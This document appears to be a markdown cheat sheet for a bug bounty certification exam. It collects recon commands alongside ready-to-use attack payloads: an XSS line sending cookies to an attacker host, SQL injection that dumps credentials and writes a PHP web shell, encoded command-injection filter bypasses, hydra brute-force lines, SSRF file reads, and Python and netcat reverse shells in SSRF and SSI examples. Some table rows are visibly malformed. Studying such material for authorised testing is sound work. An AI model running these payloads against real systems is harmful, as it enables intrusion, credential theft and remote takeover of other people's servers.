# HTB-certified-bug-bounty-hunter-exam-cheetsheet
All cheetsheets with main information about CBBH role path in one place.

# Information Gathering

### WHOIS

| Command                    | Description                               |
|----------------------------|-------------------------------------------|
| ```nslookup <target>```          | Identify A record for the target domain.  |
| ```export TARGET="domain.tld"``` | Assign target to an environment variable. |
| ```whois $TARGET```              | WHOIS lookup for the target.              |

### DNS Enumeration

| Command                          | Description                                        |
|----------------------------------|----------------------------------------------------|
| ```nslookup $TARGET```                 | Identify the A record for the target domain.       |
| ```nslookup -query=A $TARGET```        | Identify the A record for the target domain.       |
| ```dig <TARGET> @<nameserver/IP>```    | Identify the A record for the target domain.       |
| ```dig a $TARGET @<nameserver/IP>```   | Identify the A record for the target domain.       |
| ```nslookup -query=PTR <IP>```         | Identify the PTR record for the target IP address. |
| ```dig -x <IP> @<nameserver/IP>```     | Identify the PTR record for the target IP address. |
| ```nslookup -query=ANY $TARGET```      | Identify ANY records for the target domain.        |
| ```dig any $TARGET @<nameserver/IP>``` | Identify ANY records for the target domain.        |
| ```nslookup -query=TXT $TARGET```      | Identify the TXT records for the target domain.    |
| ```dig txt $TARGET @<nameserver/IP>``` | Identify the TXT records for the target domain.    |
| ```nslookup -query=MX $TARGET```       | Identify the MX records for the target domain.     |
| ```dig mx $TARGET @<nameserver/IP>```  | Identify the MX records for the target domain.     |

### Passive Subdomain Enumeration

| Resource/Command                                      | Description                                                         |
|-------------------------------------------------------|---------------------------------------------------------------------|
| VirusTotal                                            | https://www.virustotal.com/gui/home/url                             |
| Censys                                                | https://censys.io/                                                  |
| Crt.sh                                                | https://crt.sh/                                                     |
| ```curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' sort -u```| All subdomains for a given domain.              |
| ```curl -s https://sonar.omnisint.io/tlds/{domain}        jq -r '.[]' sort -u``` | All TLDs found for a given domain.              |
| ```curl -s https://sonar.omnisint.io/all/{domain}         jq -r '.[]' sort -u``` | All results across all TLDs for a given domain. |
| ```curl -s https://sonar.omnisint.io/reverse/{ip}         jq -r '.[]' sort -u``` | Reverse DNS lookup on IP address.               |
| ```curl -s https://sonar.omnisint.io/reverse/{ip}/{mask}  jq -r '.[]' sort -u``` | Reverse DNS lookup of a CIDR range.             |
| ```curl -s "https://crt.sh/?q=${TARGET}&output=json"      jq -r '.[] "\(.name_value)\n\(.common_name)"' sort -u ``` |              |

### Certificate Transparency.

``` cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done ```

Searching for subdomains and other information on the sources provided in the source.txt list.

### Passive Infrastructure Identification

| Resource/Command                                     | Description                                                |
|------------------------------------------------------|------------------------------------------------------------|
| Netcraft                                             | https://www.netcraft.com/                                  |
| WayBackMachine                                       | http://web.archive.org/                                    |
| WayBackURLs                                          | https://github.com/tomnomnom/waybackurls                   |
| waybackurls -dates https://$TARGET > waybackurls.txt | Crawling URLs from a domain with the date it was obtained. |

### Active Infrastructure Identification

| Resource/Command                                                      | Description                                   |
|-----------------------------------------------------------------------|-----------------------------------------------|
| ```curl -I "http://${TARGET}"```                                            | Display HTTP headers of the target webserver. |
| ```whatweb -a https://www.facebook.com -v```                                | Technology identification.                    |
| Wappalyzer                                                            | https://www.wappalyzer.com/                   |
| ```wafw00f -v https://$TARGET```                                            | WAF Fingerprinting.                           |
| Aquatone                                                              | https://github.com/michenriksen/aquatone      |
| ```cat subdomain.list  aquatone -out ./aquatone -screenshot-timeout 1000``` | Makes screenshots of all subdomains in the    |
| subdomain.list.                                                       |                                               |

### Active Subdomain Enumeration

| Resource/Command                                                                                         | Description                                                                |
|----------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| HackerTarget                                                                                             | https://hackertarget.com/zone-transfer/                                    |
| SecLists                                                                                                 | https://github.com/danielmiessler/SecLists                                 |
| ```nslookup -type=any -query=AXFR $TARGET nameserver.target.domain ```                                         | Zone Transfer using Nslookup against the target domain and its nameserver. |                                                        
| ```gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"``` | Bruteforcing     subdomains.                                               |

### Virtual Hosts

| Resource/Command                                                                                                                | Description                                                               |
|---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| ```curl -s http://192.168.10.10 -H "Host: randomtarget.com" ```                                                                       | Changing the HOST HTTP header to request a specific domain.               |
| ```cat ./vhosts.list  while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address>  -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done``` |Bruteforcing for possible virtual hosts on the target domain.   |                                                                         |
| ```ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612```                                                   | Bruteforcing for possible virtual hosts on  the target domain using ffuf. |                                                             

### Crawling

| Resource/Command                                                                                                                                   | Description                                                                   |
|----------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| ZAP                                                                                                                                                | https://www.zaproxy.org/                                                      |
| ```ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt``` | Discovering files and folders that cannot be spotted by browsing the website. |
| ```ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS```           | Mutated bruteforcing against the target web server.                           |

# Javascript deobfuscation

| Websites            | 
|---------------------|
| JS Console Prettier |
| Beautifier          |
| JSNice              |

# Cross-site scripting (XSS)

| Code                                                                                              | Description                    |
|---------------------------------------------------------------------------------------------------|--------------------------------|
| ```<script>alert(window.origin)</script>```                                                       | 	Basic XSS Payload             |
| ```<plaintext>```                                                                                 | 	Basic XSS Payload             |
| ```<script>print()</script>```                                                                    | 	Basic XSS Payload             |
| ```<img src="" onerror=alert(window.origin)>```                                                   | 	HTML-based XSS Payload        |
| ```<script>document.body.style.background = "#141d2b"</script>```                                 | 	Change Background Color       |
| ```<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>``` | 	Change Background Image       |
| ```<script>document.title = 'HackTheBox Academy'</script>```                                      | 	Change Website Title          |
| ```<script>document.getElementsByTagName('body')\[0].innerHTML = 'text'</script>```               | 	Overwrite website's main body |
| ```<script>document.getElementById('urlform').remove();</script>```                               | 	Remove certain HTML element   |
| ```<script src="http://OUR_IP/script.js"></script>```                                             | 	Load remote script            |
| ```<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>```               | 	Send Cookie details to us     |

# SQL injection

| Command                                                                                                                                  | Description                                               |
|------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|
| ```mysql -u root -h docker.hackthebox.eu -P 3306 -p```                                                                                         | 	login to mysql database                                  |
| ```SHOW DATABASES ```                                                                                                                          | 	List available databases                                 |
| ```USE users ```                                                                                                                               | 	Switch to database                                       | 
| ```CREATE TABLE logins (id INT, ...)```                                                                                                        | 	Add a new table                                          |
| ```SHOW TABLES ```                                                                                                                             | 	List available tables in current database                |
| ```DESCRIBE logins ```                                                                                                                         | 	Show table properties and columns                        |
| ```INSERT INTO table_name VALUES (value_1,..)```                                                                                               | 	Add values to table                                      |
| ```INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)```                                                                          | 	Add values to specific columns in a table                |
| ```UPDATE table_name SET column1=newvalue1, ... WHERE <condition> ```                                                                          | 	Update table values                                      | 
| ```SELECT * FROM table_name```                                                                                                                 | 	Show all columns in a table                              |
| ```SELECT column1, column2 FROM table_name```                                                                                                  | 	Show specific columns in a table                         |
| ```DROP TABLE logins```                                                                                                                        | 	Delete a table                                           |
| ```ALTER TABLE logins ADD newColumn INT```                                                                                                     | 	Add new column                                           |
| ```ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn```                                                                                  | 	Rename column                                            |
| ```ALTER TABLE logins MODIFY oldColumn DATE```                                                                                                 | 	Change column datatype                                   |
| ```ALTER TABLE logins DROP oldColumn```                                                                                                        | 	Delete column                                            | 
| ```SELECT * FROM logins ORDER BY column_1```                                                                                                   | 	Sort by column                                           |
| ```SELECT * FROM logins ORDER BY column_1 DESC```                                                                                              | 	Sort by column in descending order                       |
| ```SELECT * FROM logins ORDER BY column_1 DESC, id ASC```                                                                                      | 	Sort by two-columns                                      |
| ```SELECT * FROM logins LIMIT 2```                                                                                                             | 	Only show first two results                              |
| ```SELECT * FROM logins LIMIT 1, 2```                                                                                                          | 	Only show first two results starting from index 2        |
| ```SELECT * FROM table_name WHERE <condition>```                                                                                               | 	List results that meet a condition                       |
| ```SELECT * FROM logins WHERE username LIKE 'admin%'```                                                                                        | 	List results where the name is similar to a given string |
| ```admin' or '1'='1```                                                                                                                         | 	Basic Auth Bypass                                        |
| ```admin')-- -```                                                                                                                              | 	Basic Auth Bypass With comments                          | 
| ```' order by 1-- -```                                                                                                                         | 	Detect number of columns using order by                  |
| ```cn' UNION select 1,2,3-- -```                                                                                                               | 	Detect number of columns using Union injection           |
| ```cn' UNION select 1,@@version,3,4-- -```                                                                                                     | 	Basic Union injection                                    |
| ```UNION select username, 2, 3, 4 from passwords-- -```                                                                                        | 	Union injection for 4 columns                            | 
| ```SELECT @@version ```                                                                                                                        | 	Fingerprint MySQL with query output                      |
| ```SELECT SLEEP(5)```                                                                                                                          | 	Fingerprint MySQL with no output                         |
| ```cn' UNION select 1,database(),2,3-- -```                                                                                                    | 	Current database name                                    |
| ```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -```                                                                  | 	List all databases                                       |
| ```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```                                 | 	List all tables in a specific database                   |
| ```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```                | 	List all columns in a specific table                     |
| ```cn' UNION select 1, username, password, 4 from dev.credentials-- -```                                                                       | 	Dump data from a table in another database               | 
| ```cn' UNION SELECT 1, user(), 3, 4-- -```                                                                                                     | 	Find current user                                        |
| ```cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -```                                                               | 	Find if user has admin privileges                        |
| ```cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -``` | 	Find if all user privileges                              |
| ```cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -``` | 	Find which directories can be accessed through MySQL     |
| ```cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - ```                                                                                  | 	Read local file                                          |
| ```select 'file written successfully!' into outfile '/var/www/html/proof.txt'```                                                               | 	Write a string to a local file                           |
| ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - ```                                 | 	Write a web shell into the base web directory            |

# Commands injections

| Injection operator | Injected character | URL - encoded character            | Executed Command                            |
|--------------------|--------------------|------------------------------------|---------------------------------------------|
| Semicolon          | ;                  | 	%3b                               | 	Both                                       |
| New Line 	         | \n 	               | %0a                                | 	Both                                       |
| Background         | 	&                 | 	%26                               | 	Both (second output generally shown first) |
| Pipe 	             | 	%7c               | Both (only second output is shown) |
| AND 	              | && 	               | %26%26 	                           | Both (only if first succeeds)               |
| OR                 | \|\|               | 	%7c%7c 	                          | Second (only if first fails)                |
| Sub-Shell 	        | ``                 | %60%60                             | 	Both (Linux-only)                          |
| Sub-Shell          | $()                | 	%24%28%29                         | 	Both (Linux-only)                          |
### Command injection Bypass

| Command                                                    | Description                                                                       |
|------------------------------------------------------------|-----------------------------------------------------------------------------------| 
| ```printenv ```	                                                 | Can be used to view all environment variables                                     | 
| ```%09```                                                        | 	Using tabs instead of spaces                                                     |
| ```${IFS} ```                                                    | 	Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
| ```{ls,-la}```                                                   | 	Commas will be replaced with spaces                                              |
| ```${PATH:0:1}```                                                | 	Will be replaced with /                                                          |
| ```${LS_COLORS:10:1}```                                          | 	Will be replaced with ;                                                          |
| ```$(tr '!-}' '"-~'<<<[)```                                      | 	Shift character by one ([ -> \)                                                  | 
| ```' or "```                                                     | 	Total must be even                                                               |
| ```$@ or \ ```                                                   | 	Linux only                                                                       | 
| ```$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")```                           | 	Execute command regardless of cases                                              |
| ```$(a="WhOaMi";printf %s "${a,,}") ```	                         | Another variation of the technique                                                | 
| ```echo 'whoami' \| rev```                                       | 	Reverse a string                                                                 |
| ```$(rev<<<'imaohw') ```                                         | 	Execute reversed command                                                         | 
| ```echo -n 'cat /etc/passwd```                                   | grep 33' \| base64 	Encode a string with base64                                   |                                   
| ```bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)``` | 	Execute b64 encoded string                                                       |
#### Windows 
| Command                                                                                                      | Description                                   |
|--------------------------------------------------------------------------------------------------------------|-----------------------------------------------|
| ```%09```                                                                                                          | 	Using tabs instead of spaces                 |
| ```%PROGRAMFILES:~10,-5%```                                                                                        | 	Will be replaced with a space - (CMD)        |
| ```$env:PROGRAMFILES\[10]```                                                                                       | 	Will be replaced with a space - (PowerShell) | 
| ```%HOMEPATH:~0,-17%``` 	                                                                                          | Will be replaced with \ - (CMD)               |
| ```$env:HOMEPATH\[0]``` 	                                                                                          | Will be replaced with \ - (PowerShell)        |
| ```' or "``` 	                                                                                                     | Total must be even                            |
| ```^```                                                                                                            | 	Windows only (CMD)                           | 
| ```WhoAmi```                                                                                                       | 	Simply send the character with odd cases     | 
| ```"whoami"\[-1..-20] -join ''```                                                                                  | 	Reverse a string                             |
| ```iex "$('imaohw'\[-1..-20] -join '')"```                                                                         | 	Execute reversed command                     | 
| ```[Convert]::ToBase64String(\[System.Text.Encoding]::Unicode.GetBytes('whoami'))```                              | 	Encode a string with base64                  |
| ```iex "$(\[System.Text.Encoding]::Unicode.GetString(\[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"``` | 	Execute b64 encoded string                   |

# Login Brute forcing

| Command                                                                                                                              | Description                                          |
|--------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| ```hydra -C wordlist.txt SERVER_IP -s PORT http-get /```                                                                                   | 	Basic Auth Brute Force - Combined Wordlist          |
| ```hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /```                                                             | 	Basic Auth Brute Force - User/Pass Wordlists        |
| ```hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"``` | 	Login Form Brute Force - Static User, Pass Wordlist |
| ```hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4 ```                                                                    | 	SSH Brute Force - User/Pass Wordlists               |
| ```hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1```                                                                                   | 	FTP Brute Force - Static User, Pass Wordlist        |
| ```cupp -i```                                                                                                                              | 	Creating Custom Password Wordlist                   |
| ```sed -ri '/^.{,7}$/d' william.txt```                                                                                                     | 	Remove Passwords Shorter Than 8                     |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt ```                                                                                         | 	Remove Passwords With No Special Chars              |
| ```sed -ri '/[0-9]+/!d' william.txt ```                                                                                                    | 	Remove Passwords With No Numbers                    |
| ```./username-anarchy Bill Gates > bill.txt```                                                                                             | 	Generate Usernames List                             |

# Server side request forgery

| Command                                                                                                         | Description                                                                     |
|-----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------|
| ```curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080" ```                                        | 	Testing for SSRF vulnerability                                                 |
| ```python3 -m http.server 9090 ```                                                                                    | 	Starting the python web server                                                 |
| ```sudo pip3 install twisted     ```                                                                                  | 	Installing the ftp server                                                      |
| ```sudo python3 -m twisted ftp -p 21 -r . ```                                                                         | 	Starting the ftp server                                                        |
| ```curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html" ```                             | 	Retrieving a remote file through the target application (HTTP Schema)          |
| ```curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" ```                                                      | 	Retrieving a local file through the target application (File Schema)           |
| ```for port in {1..65535};do echo $port >> ports.txt;done ```                                                         | 	Generating a wordlist of possible ports                                        |
| ```ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30 ```                           | 	Fuzzing for ports on the internal interface                                    |
| ```curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000" ```                                                   | 	Interacting with the internal interface on the discovered port                 |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html" ```                             | 	Interacting with the internal application                                      |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"```                      | 	Discovering web application listening in on localhost                          |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1" ```                  | 	Modifying the URL to bypass the error message                                  |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o - ```      | 	Requesting to disclose the /proc/self/environ file on the internal application |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py" ```       | 	Retrieving a local file through the target application                         |
| ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"``` | 	Confirming remote code exeuction on the remote host                            |
| ```sudo apt-get install jq```                                                                                         | 	Installing jq                                                                  |

### Blind SSRF Exploitation Example

| Command                                                                                                                                                                                                                                  | 	Description                                    |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------|
| ```nc -lvnp 9090  ```                                                                                                                                                                                                                          | 	Starting a netcat listener                     |
| ```echo "\<B64 encoded response>" \| base64 -d   ```                                                                                                                                                                                           | 	Decoding the base64 encoded response           |
| ```export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ``` | Reverse shell payload (to be URL encoded twice) |

### SSI Injection Exploitation Example
### SSI Directive Payload 	Description

| Command                                                                                                        | Description    |
|----------------------------------------------------------------------------------------------------------------|----------------|
| ```<!--#echo var="DATE_LOCAL" -->```                                                                           | 	Date          | 
| ```<!--#printenv -->```                                                                                        | 	All variables |
| ```<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo /bin/bash 1>/tmp/foo;rm /tmp/foo" -->``` | 	Reverse Shell |

SSTI Exploitation Example 1

| Command                                                                                              | 	Description                                                          |
|------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------|
| ```curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam ```                                | 	Interacting with the remote target (Spring payload)                  |
| ```curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam ```          | 	Interacting with the remote target (Twig payload)                    |
| ```curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam ```                    | 	Interacting with the remote target (Jinja2 basic injection)          |
| ```curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam ```      | 	Interacting with the remote target (Jinja2 dump all classes payload) |
| ```curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam``` | 	Interacting with the remote target (Tornado payload)                 |
| ```curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"```                                           | 	Interacting with the remote target (Confirming Jinja2 backend)       |
| ```./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'```                                               | 	Automating the templating engine identification process with tplmap  |
